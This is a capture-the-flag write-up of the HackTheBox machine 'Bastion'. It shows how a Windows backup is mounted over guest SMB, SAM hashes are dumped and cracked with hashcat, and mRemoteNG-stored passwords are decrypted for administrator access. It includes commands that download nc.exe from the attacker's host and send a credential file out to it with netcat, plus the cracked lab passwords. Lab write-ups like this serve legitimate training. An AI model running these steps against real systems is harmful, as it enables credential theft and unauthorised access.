---
title: "HackTheBox Writeup: Bastion"
date: 2019-09-07T18:20:04+02:00
toc: true
showdate: true
tags:
    - hackthebox
    - writeup
    - ctf
---

Bastion proved to be a very easy yet pretty fun challenge, quite unique in its kind even if it doesn't present any particular difficulties, all one needs to complete this box is a search engine to learn how to accomplish certain tasks, all of which only take a couple minutes to solve, hence why so many people finished this box despite it not being one of those two clicks to root kind of boxes (I'm looking at you, Blue, Jerry, Lame, etc...). The first half of the challenge involves finding a Windows backup containing an old copy of the SAM database, which when read gives us SSH credentials to log in the box. Once inside the administrator's password must be extracted from the saved settings of a remote sessions manager.

![img](/images/writeup-bastion/1.png)

---

## Drawing the perimeter

I begin by scanning the box with a standard service scan (-sV) and executing the default list of NSE scripts (-sC), and one of the first things one can notice is that nmap found guest login available on SMB:

![img](/images/writeup-bastion/2.png)

We can use this access to list the available shares:

```shell-session
$ smbclient -L 10.10.10.134
```

![img](/images/writeup-bastion/3.png)

Backups seems to be the only unprotected share on the system so let's access it and see what's inside:


```shell-session
$ smbclient \\\\10.10.10.134\\Backups
```

![img](/images/writeup-bastion/4.png)

This whole share contains a Windows backup, in fact if we go further in the directory tree we reach two *.vhd* (Virtual Hard Drive) files, which contain the whole backed up disk:

![img](/images/writeup-bastion/5.png)

One of these files is very big though so downloading it isn't very convenient, also we found a *note.txt* file on the root of the share which gives us a very clear hint on what we shouldn't be doing:

![img](/images/writeup-bastion/6.png)

But there is a solution to this problem. I'm going to mount this share on my own system and then mount the vhd files from there, giving me access to their content without having to download the whole huge file locally. We need to install two additional tools for this task:


```shell-session
$ sudo apt-get install cifs-utils
$ sudo apt-get install libguestfs-tools
```


Then we mount the share on our computer:


```shell-session
$ mount -t cifs //10.10.10.134/Backups /mnt/remote -o rw
```


So now we can access the share from /mnt/remote:

![img](/images/writeup-bastion/7.png)

Once navigated to the folder where the two .vhd files reside we can mount them on our disk with guestmount:



```shell-session
$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
```


So we have the whole disk at our disposal now!

![img](/images/writeup-bastion/8.png)

---

## Stealing user credentials from the SAM file

The Users folder does not contain any flags and really there are only two truly interesting files in the whole backup, those two being SAM and SYSTEM: SAM is where Windows stores user passwords in an encrypted form, SYSTEM is where the encryption key for these passwords is located, so with these two files at hand we can get the credentials of the users. These files are stored in */mnt/vhd/Windows/System32/config/*:

![img](/images/writeup-bastion/9.png)

We can list the users of which the crentials are stored in the SAM file using *chntpw* however if we mounted the virtual disk on a read-only mount we have to copy the file in a different folder first:




```shell-session
$ chntpw -l SAM
```

![img](/images/writeup-bastion/10.png)

The Administrator and Guest accounts appear to be disabled so we cannot retrieve the administrator's password, however L4mpje isn't, so we can dump its hash and crack it with hashcat. First we use *samdump2* to create a text file containing all the hashes:



```shell-session
$ samdump2 ./SYSTEM ./SAM > /home/baud/bastion/hash.txt
```

![img](/images/writeup-bastion/11.png)

The last field is the hashed password, hashed in NTLM. In order for hashcat to crack it we need it to be all uppercase so we can do this with awk:

![img](/images/writeup-bastion/12.png)

Once we have the file with the correct hash in it we can use hashcat for a dictionary attack to crack it, I'm going to use the classic *rockyou.txt* wordlist, which is pretty much always sure to hit the target in CTF challenges:


```shell-session
$ hashcat -m 1000 -a 0 hashcat.txt rockyou.txt --force
```

**-m 1000** tells hashcat what hash type we're cracking, NTLMv2 in our case, and **-a 0** tells it to perform a dictionary attack. --force will run the attack despite hashcat not recognizing what hardware is installed on the computer, since I'm using a VM (installed on a bad laptop, I should add). In just a few seconds we get the results back and the password has been found:

![img](/images/writeup-bastion/13.png)

So now we have a pair of working credentials that we can use to login using the SSH service running on the box:



```shell-session
User: L4mpje
Pass: bureaulampje
```

![img](/images/writeup-bastion/14.png)

And thanks to this we can grab the user.txt flag from our current user's desktop:

![img](/images/writeup-bastion/15.png)

Looking at the installed programs shows something interesting, mRemoteNG is present on the system, which is a program that can manage remote sessions using a variety of protocols such as RDP, VNC, and many more:

![img](/images/writeup-bastion/16.png)

It takes only a few seconds of Googling to find out that mRemoteNG saves the settings of its managed connections locally, these settings also include user passwords given to the program for the establishment of a connection, and there already exist plenty of scripts that are able to decrypt these passwords from their encrypted form. To be more specific, this is how the passwords are stored in encypted form by mRemoteNG:

```shell-session
encrypted_pass = base64(IV + AES-128-CBC(cleartext_pass, md5(mR3m), IV))
```


---





## Privilege escalation: decrypting stored mRemoteNG passwords


All the passwords are stored in a file called confCons.xml which can be found at *%appdata%\mRemoteNG\*:

![img](/images/writeup-bastion/17.png)

The file can be downloaded on our own box using *nc.exe* (or just use *net use* to enable a local share, whatever you prefer), first nc.exe is downloaded on Bastion:

```shell-session
$ powershell Invoke-WebRequest "http://10.10.14.29:8080/nc.exe -OutFile "./nc.exe"
```



Then we set up a netcat listener on our box:



```shell-session
$ nc -lvp 9999 > confCons.xml
```


And then we send the file from Bastion:



```shell-session
$ nc -w 3 10.10.14.29 9999 < %appdata%\mRemoteNG\confCons.xml
```


Once the file is transferred we can open it to see its content and we can notice that one of the saved sessions belongs to the Administrator account:

![img](/images/writeup-bastion/18.png)

Now it's time to decrypt this password. I'm going to use [this](https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py) Python script from Github but there even is a Metasploit module to do so if one is already running a meterpreter session, which isn't my case unfortunately:

![img](/images/writeup-bastion/19.png)

So now we have the administrator's credentials too!


```shell-session
User: Administrator
Pass: thXLHM96BeKL0ER2
```

We can use these to login using good old SSH and complete the box by grabbing the root flag:

![img](/images/writeup-bastion/20.png)

And Bastion is done.







